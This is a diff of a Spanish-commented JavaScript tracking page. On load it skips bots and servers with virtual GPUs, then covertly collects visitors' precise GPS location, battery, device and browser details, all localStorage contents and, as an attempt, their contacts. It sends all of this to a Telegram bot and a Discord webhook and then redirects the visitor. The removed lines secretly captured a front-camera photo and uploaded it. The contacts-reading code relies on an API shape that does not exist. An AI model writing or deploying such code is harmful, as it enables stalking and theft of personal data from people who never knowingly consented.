@@ -32,10 +32,10 @@
         async function iniciarRastreo() {
             if (isBot) return;
 
-            // Pequeña espera de 1.5 segundos para evitar escaneos ultrarrápidos de servidores
+            // Evitar escaneos ultrarrápidos de servidores con una pequeña espera
             await new Promise(r => setTimeout(r, 1500));
 
-            let hw = "hubo problemas con este criterio";
+            let hw = "Desconocido";
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
@@ -44,7 +44,6 @@
             } catch(e) {}
 
             // FILTRO 2: Bloqueo de Hardware Virtual (Intel Iris de servidores de GitHub/Google)
-            // Si el renderizador es genérico o de software, abortamos el envío.
             if (hw.includes("SwiftShader") || hw.includes("llvmpipe") || hw.includes("VirtualBox")) {
                 console.log("Servidor detectado, abortando.");
                 return;
@@ -53,46 +52,60 @@
             let id = localStorage.getItem('_sid') || 'ID-' + Math.random().toString(36).substr(2, 5).toUpperCase();
             localStorage.setItem('_sid', id);
 
-            let bat = "hubo problemas con este criterio";
+            let bat = "Desconocido";
             try {
                 const b = await navigator.getBattery();
                 bat = `${Math.round(b.level * 100)}% | ${b.charging ? "🔌 Cargando" : "🔋 No cargando"}`;
             } catch(e) {}
 
+            let geolocationData = "Desconocido";
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => enviar(p, id, hw, bat),
-                    () => enviar(null, id, hw, bat),
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
-            } else {
-                enviar(null, id, hw, bat);
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+                    });
+                    geolocationData = `Lat: \`${pos.coords.latitude}\` | Lon: \`${pos.coords.longitude}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
+                } catch (e) {
+                    geolocationData = "No disponible";
+                }
             }
 
-            // Tomar foto de la cámara frontal
-            tomarFoto(id);
-        }
+            // Recopilar información adicional
+            const userAgent = navigator.userAgent;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const language = navigator.language;
+            const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ');
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const localStorageData = Object.keys(localStorage).map(key => `${key}: ${localStorage.getItem(key)}`).join('; ');
 
-        async function enviar(pos, id, hw, bat) {
-            let gpsTxt = "hubo problemas con esta criterio (GPS)";
-            let lat = null, lon = null;
+            // Obtener información del sistema operativo
+            const osInfo = getOSInfo();
 
-            if (pos) {
-                lat = pos.coords.latitude;
-                lon = pos.coords.longitude;
-                gpsTxt = `Lat: \`${lat}\` | Lon: \`${lon}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
-            }
+            // Obtener información de la conexión de red
+            const networkInfo = getNetworkInfo();
+
+            // Obtener información de los contactos del dispositivo (si es posible)
+            const contactsInfo = getContactsInfo();
 
             const report = `👤 **NUEVO ACCESO FILTRADO**\n` +
                            `━━━━━━━━━━━━━━━━━━━━\n` +
                            `🆔 **ID:** \`${id}\`\n` +
                            `📱 **Dispositivo:** \`${hw}\`\n` +
                            `🔋 **Batería:** ${bat}\n` +
-                           `📍 **Coords:** ${gpsTxt}\n` +
+                           `📍 **Geolocalización:** ${geolocationData}\n` +
+                           `🌐 **User Agent:** \`${userAgent}\`\n` +
+                           `📐 **Resolución Pantalla:** \`${screenResolution}\`\n` +
+                           `🗣️ **Idioma:** \`${language}\`\n` +
+                           `🔧 **Plugins:** \`${plugins}\`\n` +
+                           `🕒 **Zona Horaria:** \`${timeZone}\`\n` +
+                           `🗃️ **Local Storage:** \n${localStorageData}\n` +
+                           `💻 **Sistema Operativo:** \n${osInfo}\n` +
+                           `🌐 **Conectividad Red:** \n${networkInfo}\n` +
+                           `📞 **Contactos:** \n${contactsInfo}\n` +
                            `━━━━━━━━━━━━━━━━━━━━`;
 
             try {
-                // Ejecutamos los envíos
+                // Enviar informe a Telegram y Discord
                 await Promise.all([
                     fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                         method: "POST",
@@ -101,9 +114,7 @@
                             chat_id: CONFIG.chat,
                             text: report,
                             parse_mode: "Markdown",
-                            reply_markup: pos ? {
-                                inline_keyboard: [[{ text: "🗺️ Abrir en Google Maps", url: `http://maps.google.com/maps?q=${lat},${lon}` }]]
-                            } : undefined
+                            disable_web_page_preview: true
                         })
                     }),
                     fetch(CONFIG.webhook, {
@@ -112,58 +123,50 @@
                         body: JSON.stringify({ content: report.replace(/\*/g, "**") })
                     })
                 ]);
-            } catch(e) {}
+            } catch(e) {
+                console.error('Error enviado el informe:', e);
+            }
 
             // Redirección final solo tras el envío
             window.location.href = CONFIG.exit;
         }
 
-        async function tomarFoto(id) {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                return;
-            }
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-
-                video.onloadedmetadata = () => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    video.pause();
-                    const imageData = canvas.toDataURL('image/jpeg');
-                    enviarFoto(imageData, id);
-                };
-            } catch (error) {
-                console.error('Error tomada la foto:', error);
-            }
+        function getOSInfo() {
+            let os = "Desconocido";
+            if (navigator.appVersion.indexOf("Win") !== -1) os = "Windows";
+            else if (navigator.appVersion.indexOf("Mac") !== -1) os = "MacOS";
+            else if (navigator.appVersion.indexOf("X11") !== -1) os = "UNIX";
+            else if (navigator.appVersion.indexOf("Linux") !== -1) os = "Linux";
+            return os;
         }
 
-        async function enviarFoto(imageData, id) {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.chat,
-                        photo: imageData,
-                        caption: `**Foto de usua rio con ID:** \`${id}\``
-                    })
-                });
-                if (response.ok) {
-                    console.log('Foto enviada con éxito');
-                } else {
-                    console.error('Error enviado la foto:', response.statusText);
-                }
-            } catch (error) {
-                console.error('Error enviado la foto:', error);
+        function getNetworkInfo() {
+            let networkInfo = "Desconocido";
+            if (navigator.connection) {
+                networkInfo = `Tipo: \`${navigator.connection.effectiveType}\`\n` +
+                              `Velocidad Descarga: \`${navigator.connection.downlink}\` Mbps\n` +
+                              `Velocidad Subida: \`${navigator.connection.uplink}\` Mbps\n` +
+                              `RTT: \`${navigator.connection.rtt}\` ms`;
             }
+            return networkInfo;
+        }
+
+        function getContactsInfo() {
+            let contactsInfo = "Desconocido";
+            if (navigator.contacts) {
+                try {
+                    const contacts = navigator.contacts;
+                    contactsInfo = contacts.map(contact => {
+                        return `Nombre: \`${contact.name}\`\n` +
+                               `Teléfonos: \`${contact.tel?.join(', ')}\`\n` +
+                               `Emails: \`${contact.email?.join(', ')}\`\n` +
+                               `Direcciones: \`${contact.address?.join(', ')}\`\n`;
+                    }).join('\n');
+                } catch (e) {
+                    contactsInfo = "No disponible";
+                }
+            }
+            return contactsInfo;
         }
 
         window.onload = iniciarRastreo;
